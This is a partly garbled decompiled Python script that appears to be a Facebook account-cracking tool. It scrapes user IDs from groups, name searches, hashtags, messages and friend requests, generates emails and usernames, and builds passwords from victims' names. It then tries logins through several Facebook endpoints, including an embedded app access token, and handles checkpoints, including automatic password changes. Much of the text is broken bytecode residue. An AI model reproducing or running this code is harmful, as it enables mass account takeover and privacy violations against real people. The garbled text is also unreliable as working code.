%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari Grup SayarQ  )"r,  r	  rT  r  r?   ?contentr%  ?findr&  r?   r?   r)  rE  rx   rR  rc   r?   rt   r*   rz   r?   r  ry   r  ra   rb   rd   rU  r*  r?   r  r  r5   r{   )rI  rV  r?   Zsop_dev?members?devZuser_Znama_r+  rT  rW  rZ   rZ   r[   rU  ?  s&   0$0
8.?@?6
? ??
"?zdump_grup.exec_grup_sayac                 C   s  t dttttf ?}|dkrtdttttf ? t?  d S t?t	d| t
| jd?jd?}d|?d?j?? v rEtd	ttttf ? t?  d S ||?d?jd
?| _| ?|? tdt ? tdtttt| j?d?f ? t dttttf ?}tdttttf ? |dv r?tdttttf ? t?  d S |dv ?rz&| ?d| ? tdtttttt| j??? ?? ?| j?d?f ? t| j?W S  ty?   tdtttttt| j??? ?? ?| j?d?f ? t| j? Y S  t?y } ztdtttt|f ? t?  W Y d }~d S d }~ww |dv ?ryz&| ?d| ? tdtttttt| j??? ?? ?| j?d?f ? t| j?W S  t?yW   tdtttttt| j??? ?? ?| j?d?f ? t| j? Y S  t?yx } ztdtttt|f ? t?  W Y d }~d S d }~ww tdttttf ? t?  d S )Nu    %s [%s•%s] %sENTER GROUP ID : r   r?   ?https://m.facebook.com/groups/?r?   r  r  z
no content?titlez%%s [%s!%s] %sPRIVATE GROUP / WRONG IDrL  r}   r?   r?   u)   %s [%s•%s] %sDump ID/Username? [i/u] : r  r?   ?r?   r,   r   ?-   
%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %srQ  ??u?Ur#   ?-   
%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM %srP  )r?   r*   rz   r?   rj   r5   r?   r(  r   r?   r<  r  r?   r\  rr   ?listedr?   rt   r	  ?dump_idr  rx   rR  ry   r  r  r*  r  r{   r?   )rI  r?   rv   r?   rW  rZ   rZ   r[   rN  ?  s&   &2p&
NL:? 
NN:? zdump_grup.manualc                 C   s?   g }t dttttf ??? }|dkr| ??  d S t| j?D ])\}}||?d??? v rF|?	|? t
dttt|?tt|?d??|d| ?f ? qt|?dkr\tdttttf ? t?  d S | ?||? d S )Nu   %s [%s•%s] %sNAME : r   r?   z%s [%s%s%s] %s%s?%sr   z&%s [%s!%s] %sPRIVATE GROUP OR WRONG ID)r?   r*   rz   r?   rr   r?   ?	enumeraterF  r	  r   rt   r  r?   rj   r5   r?   ?choice)rI  ?	whitelistr?   ri   r?   rZ   rZ   r[   r?     s   J?*zdump_grup.searchc                 C   sT  ?z_|t tdttttf ??t d?  | _| ?|? tdt ? tdtttt| j?d?f ? tdttttt	t
t	tt	f	 ?}tdttttf ? |dv r\td	t
tt
tf ? t?  W d S |d
v r?z+| ?d| j?d? ? tdtttttt| j??? ?? ?| j?d?f ? t| j?W W S  ty?   tdtttttt| j??? ?? ?| j?d?f ? t| j? Y W S  ty? } ztdt
tt
t|f ? t?  W Y d }~W d S d }~ww |dv ?rQz+| ?d| j?d? ? tdtttttt| j??? ?? ?| j?d?f ? t| j?W W S  t?y.   tdtttttt| j??? ?? ?| j?d?f ? t| j? Y W S  t?yP } ztdt
tt
t|f ? t?  W Y d }~W d S d }~ww td	t
tt
tf ? t?  W d S  t?y?   tdtttttt| j??? ?? ?| j?d?f ? t| j? Y S  t?y? } ztdt
tt
t|f ? t?  W Y d }~d S d }~ww )Nr?   r	   r}   r?   r?   u0   %s [%s•%s] %sDUMP/USERNAME? %s[%si%s/%su%s] : r  r?   r?   rb  r_  r?   rc  rg  rP  rd  )?intr?   r*   rz   r?   rh  r?   rt   r	  r?   r5   rj   r?   ri  r  rx   rR  ry   r  r  r*  r  r{   r?   )rI  rm  r?   r?   rW  rZ   rZ   r[   rl    s(   ?(XN:? 
XP<?  N:? zdump_grup.choicec                 C   sR   |? dd?d | _| jdkr| ??  zt?| j? W n   Y t| jd???  d S )Nr?   r?   r?   r   r?   )r?   rR  r?   rX   rY   rx   r?   )rI  r?   rZ   rZ   r[   r?   '  s
   zdump_grup.fc                 C   s?  t ?t|| jtd?jd?}tdtttt	tt
t| j??? ?? ?f dd? tj??  |?d?D ]?}z?t
t j?d|jdd	d
??d???dkr?|jdd	d
?}d|?d?v r?d?t j?d|?d???}t
|?dkrgW q.|t| j??? v rrW q.t| jd??d||jf ? W q.d?t j?d|?d???}t
|?dkr?W q.|t| j??? v r?W q.t| jd??d||jf ? W q.   Y q.|jdd	d
?D ]1}d|jv r?	 z| ?d|?d? ? W n ty? } ztdttttf ? W Y d }~q?d }~ww q?d S )Nr8  r  r  r?   r  r:  ?\/r?   Tr  r  r	   r  r   r  r   r   r!  rC  ?See More Posts?https://m.facebook.com/z%s [%s!%s] %sREPEAT)r(  r   r?   r  r<  r?   rt   r*   rz   r?   r  rx   rR  ry   r  ra   rb   rd   r&  r?   r)  r\  r	  r'  rc   r?   r  r5   ?rI  r+  rv   r?   Zogehr?   ri   rZ   rZ   r[   r?   -  s2   R& ?

.? ??zdump_grup.dump_usernamec                 C   s?  t ?t|| jtd?jd?}tdtttt	tt
t| j??? ?? ?f dd? tj??  |?d?D ]?}z?t
t j?d|jdd	d
??d???dkr?|jdd	d
?}d|?d?v r?d?t j?d|?d???}t
|?dkrgW q.|t| j??? v rrW q.t| jd??d||jf ? W q.d?t j?d|?d???}t
|?dkr?W q.|t| j??? v r?W q.t| jd??dt|?|jf ? W q.   Y q.|jdd	d
?D ]1}d|jv r?	 z| ?d|?d? ? W n ty? } ztdttttf ? W Y d }~q?d }~ww q?d S )Nr8  r  r  r?   r  r:  ro  r?   Tr  r  r	   r  r   r  r   r   r!  rC  rp  rq  z%s [%s!%s] %sMengulangi)r(  r   r?   r  r<  r?   rt   r*   rz   r?   r  rx   rR  ry   r  ra   rb   rd   r&  r?   r)  r\  r	  r'  rc   ?_get_id_ri  r  r5   rr  rZ   rZ   r[   ri  C  s2   R&  ?

.? ??zdump_grup.dump_idN)?__name__?
__module__?__qualname__rJ  rH  rM  rU  rN  r?   rl  r?   r?   ri  rZ   rZ   rZ   r[   r?   ?  s    r?   c                 C   s?   d}t ?2}d?| ?dd?}d| v r| dd?}|j||d?j}t|d?}|jdd	d
?}|j}|W  d   ? S 1 s9w   Y  d S )Nzhttps://lookup-id.com/#zhttps://m.facebook.com/{}ZLookup)ZfburlZcheckZfacebook?r?   r  ?span?coderX  )r,  rS  ?postr[  r%  r\  r?   )?usernamer+  r^  ZpayloadZdata_devZsop_Zid_Zuser_get_idrZ   rZ   r[   rs  [  s   .$?rs  c              	   C   s?   t dttttf ? tdttttf ??d?}d}zt?|? W n   Y |D ]}d| }t|| |? q't	|d??
? ?? }t dtttttt|??f ? t|?S )Nu%   %s [%s•%s] %sEXAMPLE : Alien, Karma?   %s [%s•%s] %sENTER NAME : ?,zdump_name.jsonz-https://mbasic.facebook.com/search/people/?q=rv   ?   
%s [%s•%s] %sTOTAL ID : %s)rt   r*   rz   r?   r?   r>  rX   rY   ?	cari_namarx   ry   r  r?   rE  r  r  )r?   rt  r  ?_name_r6  r.  rZ   rZ   r[   r?   d  s   20r?   c           	      C   s?  t | d? t?t||td?jd?}|jddd?D ]?}tdtt	tt
ttt | ??? ?? ?f dd	? tj??  d
t|?v r?dt|d ?v rDqt|d ?}d|v r?|?d??d??dd?}tj?d|?}t|?dkr?d?|?}|t | ??? v run@t | d??d||f ? n3tj?d|?}|?d??d??dd?}t|?dkr?d?|?}|t | ??? v r?nt | d??d||f ? d|jv r?t| ||d ? qd S )Nr   r8  r  r?   Tr  r  r   r  z	<img alt=zhome.phpr  r  ZimgZaltz, profile picturez/profile\.php\?id=(.*?)&r   r!  rC  ?See More Results)rx   r(  r   r?   ?header_namar?   r&  rt   r*   rz   r?   r  ry   r  ra   rb   rd   rE  r\  r	  r?   r?   r)  r'  rc   r  )	r  ?	_cookies_r6  ?_req_ses_dev_Z_azimvau_dev_Z	_str_dev_r?  Z_find_?_user_rZ   rZ   r[   r  k  s*   "6&
?&
??r  c                   @   s   e Zd Zdd? Zdd? ZdS )r?   c                 C   s<   || _ || _|d ?dd?| _t| jd???  | ?d? d S )Nr?   r?   r?   r?   zhttps://m.facebook.com/messages)r  r?   r?   ?filesrx   r?   ?dump)rI  r?  Z_nama_r@  rZ   rZ   r[   rJ  ?  s   <zdump_pesan.__init__c                 C   sV  t ?t|t| jd?jd?}|jddd?D ]x}d|?d?v r}t j?	d|?d??}zCt
|?? ?D ]:}|| jv r6q.d	|j?? v r>q.t| jd
??d||jf ? tdttttttt| j??? ?? ?f dd? tj??  q.W n ty| } zW Y d }~qd }~ww d|jv r?| ?d|?d? ? qt| jd??? ?? }tdtttttt|??f ? t| j?S )Nr`  r  r?   Tr  z/messages/readr  zcid\.c\.(.*?)%3A(.*?)&zFacebook userr   r!  r  r   r  zSee Older Messagesrq  rv   r~  ) r(  r   r?   r?  r  r?   r&  r	  r?   r)  ?list?popr?   rr   rx   r?  rc   rt   r*   rz   r?   r  ry   r  ra   rb   rd   r  r?  r?   rE  r  )rI  r+  r?  Z_dev_Z_soup_r?  ri   r.  rZ   rZ   r[   r?  ?  s"   V?? ?2
zdump_pesan.dumpN)rt  ru  rv  rJ  r?  rZ   rZ   rZ   r[   r?   ?  s    r?   c               	   C   s?   z*t d? tdtttttf ?} t| ??? ?? }t dtttttt|?f ? t	| ?W S  t
yA   t dttttf ? t?  Y d S w )Nr   u   %s [%s•%s] %sFILE : %sr  ?%s [%s!%s] %sFILE NOT EXISTING)rt   r  r*   rz   r?   r  ry   r  r  r  ?FileNotFoundErrorr5   r?   )r  r?   rZ   rZ   r[   r?   ?  s   
?r?   c                  C   s  t dttttf ? tdttttf ??? } t| ?dk r.tdttttf ? t	?
d? t?  t dtttttf ? tdttttf ??? }d|v rP|?d?d	 }ttd
ttttf ??}ttdttttf ??}| d ?dd?}zt?|? W n   Y t| ||||? d S )Nu)   %s [%s•%s] %sEXAMPLE : Mark Zuckerberg r|  ?   ?,%s [%s!%s] %sNAME MUST BE MORE THAN 2 DIGITSr/   u$   %s [%s•%s] %sEXAMPLE : %sgmail.comu   %s [%s•%s] %sENTER DOMAIN : ?@r	   u&   %s [%s•%s] %sENTER STARING NUMBER : u%   %s [%s•%s] %sENTER ENDING NUMBER : r?   r?   r?   )rt   r*   rz   r?   r?   rr   r  rj   r5   re   rf   r?   r>  rn  r?   rX   rY   ?
exec_email)r  ?_domain_?_limit_awal_?_limit_akhir_r  rZ   rZ   r[   r?   ?  s   ,0.@r?   c              
   C   s?  |d }|d }|d }|d }d| v r?z	| ? d?d }	W n   Y z	| ? d?d }
W n   Y z	| ? d?d }W n?   Y n?d| v rnz	| ? d?d }	W n   Y z	| ? d?d }
W n   Y z	| ? d?d }W nl   Y ngd| v r?z	| ? d?d }	W n   Y z	| ? d?d }
W n   Y z	| ? d?d }W n=   Y n8d| v r?z	| ? d?d }	W n   Y z	| ? d?d }
W n   Y z	| ? d?d }W n   Y n	z| }	W n   Y z?t||?D ]$}z|	}d|	t|?|f }t|d	??d
||f ? |d7 }W q?   Y q?t||?D ]&}z|
}d|
t|?|f }t|d	??d
||f ? |d7 }W ?q   Y ?qt||?D ]&}z|}d|t|?|f }t|d	??d
||f ? |d7 }W ?q1   Y ?q1t||?D ]V}zNd| v ?rn| }| ?dd?}n$d| v ?r|| }| ?dd?}nd| v ?r?| }| ?dd?}n| ?dd?}| }d|t|?|f }t|d	??d
||f ? |d7 }W ?q]   Y ?q]W n   tdttttf ? t	?
d? t?  Y t|d??? ?? }tdttttttt|??f ? t|?S )Nr	   r?   r   r/   ?.r?   ?-z%s%s@%sr   r!  r   ?%s [%s!%s] %sTHERE IS AN ERRORrv   r  )r>  ?rangerE  rx   rc   r?   rj   r5   rz   re   rf   r?   ry   r  rt   r*   r?   r  r  )?	__query__r?  r?  r?  r  ?_hitung_email_1_?_hitung_email_2_?_hitung_email_3_?_hitung_email_full_?	_query_1_?	_query_2_?	_query_3_?_jumlah_?nama?emailr  r.  rZ   rZ   r[   r?  ?  sr    




<
>>8?
 r?  c                  C   s?   t dtttttf ? tdttttf ??? } t| ?dk r/tdttttf ? t	?
d? t?  ttdttttf ??}ttdttttf ??}| d ?d	d
?}zt?|? W n   Y t| |||? d S )Nu+   %s [%s•%s] %sEXAMPLE : %smark.zuckerburger|  r?  r?  r/   u/   %s [%s•%s] %sENTER STARTING NUMBER (EX: 1) : u/   %s [%s•%s] %sENTER ENDING NUMBER (EX: 1000): r?   r?   r?   )rt   r*   rz   r?   r?   rr   r  rj   r5   re   rf   r?   rn  r?   rX   rY   ?exec_username)r  r?  r?  r  rZ   rZ   r[   r?   ?  s   .0@r?   c              
   C   s?  |d }|d }|d }|d }d| v r?z	| ? d?d }W n   Y z	| ? d?d }	W n   Y z	| ? d?d }
W n?   Y n?d| v rnz	| ? d?d }W n   Y z	| ? d?d }	W n   Y z	| ? d?d }
W nl   Y ngd| v r?z	| ? d?d }W n   Y z	| ? d?d }	W n   Y z	| ? d?d }
W n=   Y n8d| v r?z	| ? d?d }W n   Y z	| ? d?d }	W n   Y z	| ? d?d }
W n   Y n	z| }W n   Y z?t||?D ]#}z|}d|t|?f }t|d	??d
||f ? |d7 }W q?   Y q?t||?D ]%}z|	}d|	t|?f }t|d	??d
||f ? |d7 }W ?q   Y ?qt||?D ]%}z|
}d|
t|?f }t|d	??d
||f ? |d7 }W ?q/   Y ?q/t||?D ]U}zMd| v ?rk| }| ?dd?}n$d| v ?ry| }| ?dd?}nd| v ?r?| }| ?dd?}n| ?dd?}| }d|t|?f }t|d	??d
||f ? |d7 }W ?qZ   Y ?qZW n   tdttttf ? t	?
d? t?  Y t|d??? ?? }tdttttttt|??f ? t|?S )Nr	   r?   r   r/   r?  r?   r?  r;  r   r!  r   r?  rv   r  )r>  r?  rE  rx   rc   r?   rj   r5   rz   re   rf   r?   ry   r  rt   r*   r?   r  r  )r?  r?  r?  r  r?  r?  r?  r?  r?  r?  r?  r?  r?  r?  r  r.  rZ   rZ   r[   r?  ?  sj    




:
<<6?,2r?  c              	   C   s?   t dttttf ?}d| }|d ?dd?}zt?|? W n   Y tdttttf ? t	|| |? tdttttt
t|??? ?? ?f ? t|?S )Nu   %s [%s•%s] %sENTER HASHTAG : z$https://mbasic.facebook.com/hashtag/r?   r?   r?   r  r  )r?   r*   rz   r&   r?   rX   rY   rt   r?   ?exec_hashtagr  rx   ry   r  r  )r  r  r  r  rZ   rZ   r[   r?   '  s   ,Nr?   c                 C   s?  t |d? t?? }|j| |td?}t|jd?}t |??? }tdt	t
t	tt	tt|??? ?? ?f dd? tj??  z?|?d?D ]?}|jddd	?D ]l}d
|?d?v rQqGd|?d?v r?z(|j}	d?tj?d|?d???}
|	|v rnnd|
v rsnt |d??d|
|	f ? W qG   Y qGz(|j}	d?tj?d|?d???}
|	|v r?nd|
v r?nt |d??d|
|	f ? W qG   Y qG|jddd	?D ]}d|jv r?|?d?}t|||? q?q>W d S  ty?   tdt	t
t	ttt|??? ?? ?f ? t|? Y S w )Nr?   r8  r  r  r   r  r:  Tr  r   r  r  r  r  r   r!  rC  r?  r  )r  r?   r$  r	  ?header_hashtagr%  r?   ry   rt   r*   rz   r?   r  rx   r  ra   rb   rd   r&  r'  r(  r?   r)  rc   r?  r*  r  ?r+  r  r  r,  r?   r-  r.  r?   r?   r/  r0  r1  rZ   rZ   r[   r?  ,  s4   p 

?
 

?
 ???@r?  c              	   C   ?n   d}d}zt ?|? W n   Y tdttttf ? t|| |? tdtttttt	|??
? ?? ?f ? t|?S )Nz$https://mbasic.facebook.com/home.phpzberanda.jsonr  r  )rX   rY   rt   r*   rz   r?   ?exec_berandar?   r  rx   ry   r  r  ?r  r  r  rZ   rZ   r[   r?   F  ?   Nr?   c                 C   s?  t |d? t?? }|j| |td?}t|jd?}t |??? }tdt	t
t	tt	tt|??? ?? ?f dd? tj??  z?|?d?D ]?}|jddd	?D ]d}d
|?d?v r~z(|j}	d?tj?d|?d???}
|	|v rfnd|
v rknt |d??d|
|	f ? W qG   Y qGz(|j}	d?tj?d|?d???}
|	|v r?nd|
v r?nt |d??d|
|	f ? W qG   Y qG|jddd	?D ]}d|jv r?d|?d? }t|||? q?q>W d S  ty?   tdt	t
t	ttt|??? ?? ?f ? t|? Y S w )Nr?   r8  r  r  r   r  r:  Tr  r  r  r  r  r   r!  rC  zSee More Storiesr#  r  )r  r?   r$  r	  r?  r%  r?   ry   rt   r*   rz   r?   r  rx   r  ra   rb   rd   r&  r'  r(  r?   r)  rc   r?  r*  r?   r  r?  rZ   rZ   r[   r?  K  s2   p 

?
 

?
$???@r?  c              	   C   sn   d}d}zt ?|? W n   Y tdttttf ? t|| |? tdtttttt|??	? ?
? ?f ? t|?S )Nz3https://mbasic.facebook.com/friends/center/requestszfriend_login.jsonr  r  )rX   rY   rt   r*   rz   r?   ? exec_permintaan_pertemanan_masukr  rx   ry   r  r  r?  rZ   rZ   r[   r?   b  r?  r?   c           
      C   sP  t |d? t?? }|j| |td?}t|jd?}tdtt	tt
ttt|??? ?? ?f dd? tj??  zU|jddd?D ].}d	|?d
?v rgz|j}d?tj?d|?d
???}t |d??d||f ? W q:   Y q:	 q:|jddd?D ]}d|jv r?d|?d
? }	t|	||? qpW d S  ty?   tdtt	tt
tt|??? ?? ?f ? t|? Y S w ?Nr?   r8  r  r  r   r  Tr  z/friends/hovercardr  z
uid=(.*?)&r   r!  zSee Morer#  r  )r  r?   r$  r	  r?  r%  r?   rt   r*   rz   r?   r  rx   ry   r  ra   rb   rd   r&  r'  r(  r?   r)  rc   r?  r*  r  ?
r+  r  r  r,  r?   r-  r?   r/  r0  r1  rZ   rZ   r[   r?  g  ?   d>
$??@r?  c              	   C   r?  )Nz<https://mbasic.facebook.com/friends/center/requests/outgoingzfriend_out.jsonr  r  )rX   rY   rt   r*   rz   r?   ?!exec_permintaan_pertemanan_keluarr?   r  rx   ry   r  r  r?  rZ   rZ   r[   r?   t  r?  r?   c           
      C   sP  t |d? t?? }|j| |td?}t|jd?}tdtt	tt
ttt|??? ?? ?f dd? tj??  zU|jddd?D ].}d	|?d
?v rgz|j}d?tj?d|?d
???}t |d??d||f ? W q:   Y q:	 q:|jddd?D ]}d|jv r?d|?d
? }	t|	||? qpW d S  ty?   tdtt	tttt|??? ?? ?f ? t|? Y S w r?  )r  r?   r$  r	  r?  r%  r?   rt   r*   rz   r?   r  rx   ry   r  ra   rb   rd   r&  r'  r(  r?   r)  rc   r?  r*  r?   r  r?  rZ   rZ   r[   r?  y  r?  r?  c                 C   s?   t dd? zEt dd??? }| |v r>| dkrW d S tdttttf ?}|dv r)W d S |dv r0W d S |dv r:t?  W d S 	 W d S tdd??d	|  ? W d S    Y d S )
Nzlist_id.txtr   rv   ?mez4%s [%s!%s] %sID HAS BEEN CRACKED, CONTINUE? [Y/n] : )r   r?   )r   rH   r?   )r#   r?   r?   z%s
)r  ry   r?   r5   rz   r?   rx   rc   )r@  Z_cek_Z_cokzz_rZ   rZ   r[   r?   ?  s   
r?   c                 C   s?   g }| ? d?D ]H}t|?dk rq|?? }t|?dks&t|?dks&t|?dkr5|?|d ? |?|d ? qt|?dkrO|?|? |?|d ? |?|d ? qq|?| ?? ? |S )Nr?   r?  ?   ?   ?123?12345?   ?r>  r  rr   r   ?r?   r?   r?   rZ   rZ   r[   ?	generate1?  s   B4r?  c                 C   s?   g }| ? d?D ]V}t|?dk rq|?? }t|?dks&t|?dks&t|?dkr<|?|d ? |?|d ? |?|d ? q|?|? |?|d ? |?|d ? |?|d ? |?|d ? q|?| ?? ? |?| ?? ? d?d	 | ?? ? d?d
  ? |S )Nr?   r?  r?  r?  r?  ?1234r?  rS   r   r	   r?  r?  rZ   rZ   r[   ?	generate2?  s   PD8r?  c                 C   s?  g }| ? d?D ]{}t|?dk rq|?? }t|?dks&t|?dks&t|?dkrC|?|d ? |?|d ? |?|d ? |?|d ? q|?|? |?|d	 ? |?|d
 ? |?|d ? |?|d ? |?|d ? |?|?? d ? |?|d ? |?|d ? q|?| ?? ? |?| ?? ? d?d | ?? ? d?d  ? |?| ?? ? d?d | ?? ? d?d  d
 ? |?| ?? ? d?d | ?? ? d?d  d ? |?d? |S )Nr?   r?  r?  r?  r?  r?  r?  z@123r   rS   z@#z123@#r   r	   Z889900)r>  r  rr   r   r?   r?  rZ   rZ   r[   ?	generate3?  s   ^??r?  c                 C   s$  g }t dd??? }t dd??? }| ?d?D ]A}|?? }t|?dk r"qt|?dks4t|?dks4t|?dkrC|?|d ? |?|d	 ? q|?|? |?|d ? |?|d	 ? q|d
v r\n| ?d?D ]}|?? }|?d?D ]	}|?|| ? qlqa|d
v r|n|?d?D ]}|?|? q?|?| ?? ? |S )N?pass.txtrv   ?digitpass.txtr?   r?  r?  r?  r?  r?  ?r   r?   z  r}  )rx   ry   r>  rr   r  r   )r?   r?   ZpsZppr?   r?   rh   rZ   rZ   r[   ?	generate4?  s    B(
 
r?  c                  C   sT   t dt ? t dtttttf ? tdttttf ?} tdd?}|?| ? |j d S )Nr}   u5   %s [%s•%s] %sEXAMPLE : %778899,123456,102030,786786u9   %s [%s•%s] %sENTER MANUAL SUPPLEMENTAL PASS [1 WORD] : r?  r?   )	rt   r?   r*   rz   r?   r?   rx   rc   r?   )ZcuyZghrZ   rZ   r[   ?tambah_pass?  s   Tr?  c                  C   sH   t dtttttf ? tdttttf ?} tdd?}|?| ? |j d S )Nu)   %s [%s•%s] %sEXAMPLE : %s143,786,gamingu3   %s [%s•%s] %sENTER ADDITIONAL PASS BEHIND NAME : r?  r?   )rt   r*   rz   r?   r?   rx   rc   r?   )ZcoyZxyrZ   rZ   r[   ?tambah_pass_angka?  s   Hr?  c              	   C   s?   t dd??? }t?? }tt?dd??tt?dd??tt?dd??dd|d	d
d?}|jd|  d | d |d?}d|jv rGd|jv rGd| |d?S d|?	? d v rUd| |d?S d| |d?S )Nr?   rv   ?    ?sA?    8?|A? N  ?@?  ?	EXCELLENT?!cell.CTRadioAccessTechnologyHSDPAr   ?Liger?zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer
   r   zx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a?  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=truer?   ?session_key?EAAA?ok??statusr?  ?pass?www.facebook.com?	error_msg?cp?error?
rx   ry   r?   r$  rE  ?randomr   r	  r?   r?   )?em?pasr?   rv   r?   ?responserZ   rZ   r[   ?	log_api_1?  s   : r?  c              
   C   s?   t dd??? }t?? }tt?dd??tt?dd??tt?dd??dd|d	d
d?}ddd| d|dddd?	}d}|j|||d?}d|jv rNd|jv rNd| |d?S d|?	? d v r\d| |d?S d| |d?S )Nr?   rv   r?  r?  r?  r?  r?  r?  r   r?  r?  z/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32r?   r#   Zen_USZiosr   Z 3f555f99fb61fcd7aa0c44f58f522ef6)	Zaccess_tokenrS  Zsdk_versionr?  ?locale?passwordZsdkZgenerate_session_cookiesZsigz,https://b-api.facebook.com/method/auth.login)?paramsr?   r?  r?  r?  r?  r?  r?  r?  r?  r?  )r?  r?  r?   rv   r?   ZparamZapir?  rZ   rZ   r[   ?	log_api_2?  s   : r?  c              
   C   ??   t dd??? }t?? }|j?ddd|dddd	?? |?d
?}|jd| |dd?d?}d?dd? |j	?
? ?? D ??}d|j	?
? ?? v rHd| ||d?S d|j	?
? ?? v rXd| ||d?S d| |d?S )Nr?   rv   r   r   r   r   r   r   ?r   r   r   r
   r   r   r   r#  z%https://mbasic.facebook.com/login.php?submit?r?  r?  Zloginrw  ?;c                 S   ?   g | ]
\}}d ||f ?qS ?z%s=%srZ   ??.0?key?valuerZ   rZ   r[   ?
<listcomp>?  ?    z log_mbasic_1.<locals>.<listcomp>?c_userr?  ?r?  r?  r?  r  ?
checkpointr?  r?  r?  ?rx   ry   r?   r$  r?   ?updater	  rz  r'  r  ?get_dict?items?keys?r?  r?  r?   rv   r?   r?   ?_raw_cookies_rZ   rZ   r[   ?log_mbasic_1?  ?   
  r?  c                 C   ??  t dd??? }t?? }|j?ddd|dddd	?? |?d
?}t?|j	d?}d?
tj?d|j	??}i }|d?D ]?}|?d?d u rh|?d?dkrN|?d| i? q6|?d?dkr]|?d|i? q6|?|?d?di? q6|?|?d?|?d?i? q6|?|dddddddd?? |j?ddi? |jd|d?j	}	d?
dd? |j?? ?? D ??}
dt|j?? ?? ?v r?d| ||
d?S d t|j?? ?? ?v r?d!| ||
d?S d"| |d#?S )$Nr?   rv   r   r   r   r   r   r   r?  r#  r  r   ?dtsg":\{"token":"(.*?)"r  r?  r?   r?  r?  r?   r?   ??fb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassr   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100rw  r?  c                 S   r?  r?  rZ   r?  rZ   rZ   r[   r?  ?  r?  z log_mbasic_2.<locals>.<listcomp>r?  r?  r?  r?  r?  r?  r?  ?rx   ry   r?   r$  r?   r?  r	  r(  r   r?   r'  r?   r)  rz  r  r?  r?  r?  r?  ?r?  r?  r?   rv   r?   r?   ?metar?   r?   Zpor?  rZ   rZ   r[   ?log_mbasic_2?  ?(   
$$r?  c              
   C   r?  )Nr?   rv   ?m.facebook.comr   r   r   r   r   r?  rq  z https://m.facebook.com/login.phpr?  r?  rw  r?  c                 S   r?  r?  rZ   r?  rZ   rZ   r[   r?  	  r?  z log_mobile_1.<locals>.<listcomp>r?  r?  r?  r?  r?  r?  r?  r?  r?  rZ   rZ   r[   ?log_mobile_1  r?  r   c                 C   r?  )$Nr?   rv   r?  r   r   r   r   r   r?  rq  r  r   r?  r  r?  r?   r?  r?  r?   r?   r?  r   r   zyhttps://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100rw  r?  c                 S   r?  r?  rZ   r?  rZ   rZ   r[   r?    r?  z log_mobile_2.<locals>.<listcomp>r?  r?  r?  r?  r?  r?  r?  r?  r?  rZ   rZ   r[   ?log_mobile_2  r?  r  c              	   C   st  t ?? }z	tdd??? }W n   d}Y z	tdd??? }W n   d}Y z	tdd??? }W n   d}Y |j?dd	d
ddtd?? t|?t	d ?j
d?}|?dddi?}|d?D ]}	t?|	?d?|	?d?i? qXt?| |d?? |jt	|?d? td?}
t|
j
d?}d|j?? v r?d|
j
v r?d S d?|j?? ?}dttt| |t| ?tf }t|t|?? d S d|j?? v ?r?d}g }t?dt|??}|?dddi?}g d ?}|d?D ]}|?d?|v r?t?|?d?|?d?i? q?|jt	|?d? td?}t|j
d?}d!d"? |?d#?D ?}t|?dk?rGd$|v ?rD|dk?rt| |||? d S |dk?r6t|? td%ttf ? td? d S t|? td%ttf ? d S 	 d S t|?dk?r?|dk?r?tt|??D ]}|d&7 }|?d't t|d& ? d( ||  d) ? ?qYd*ttt|??f }t|? t|d?|? ? td? d S t|? d S d S d+|v ?r?t|? td,tt tt f ? td? d S t|? d S )-N?option_.txtrv   rw   ?auto_ganti.txt?Yes?muncul_opsi.txt?Nor   z?text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r   zen-GB,en-US;q=0.9r#  )r   r   r   r   r   r
   z/login/?next&ref=dbl&fl&refid=8r  ?formr   rz  r  r?   r?  )r?  r?  ?actionrw  r?  zyour account has been lockedr   ?*    %s[%sAlien-OK%s] %s • %s%s%s          r?  r   ?\<title>(.*?)<\/title>)r?  ?jazoest?checkpoint_datazsubmit[Continue]?nhc                 S   s   g | ]}|j ?qS rZ   )r?   )r?  r?   rZ   rZ   r[   r?  6  s    zcek_opsi.<locals>.<listcomp>Zoptionz*Check the login details shown. Was it you?u      %s• %sONE TAP ACCOUNTr	   z
     z. r?   z%s   HERE ARE %s OPTIONS : r?   z&%s   [%s!%s] %sPASSWORD HAS CHANGED :()!r?   r$  r  ry   r?   r?  r?   r%  r	  ?hostr?   r\  ?data_1rz  r  r?  r'  r*   rz   ?tahun?cek_apk?cvt_cookiesr?   r)  rE  ?data_2r&  r  ?change_passrt   r?  r   r5   )?user?pwrS  r,  Zcek_dev_opsiZ_auto_change_pass_?cek_pilih_opsir-  Z	_linkurl_r?   Z
_url_post_?
_response_r?  ?_result_ok_Z_ratya_Zjumlah_opsiZ_title_dev_?link_2Z
list_inputr?   Z	_req_act_Z_response2_Z_check_opsi_Z_asu_ZjumoprZ   rZ   r[   ?cek_opsi$  sB   @(4<0(?8
.
F:?2r  c                 C   s2  	 t dttttf ?}|dv rtdttttf ? t?  d S |dv r{tdd??d? t d	ttttf ?}t	|?d
k rMt
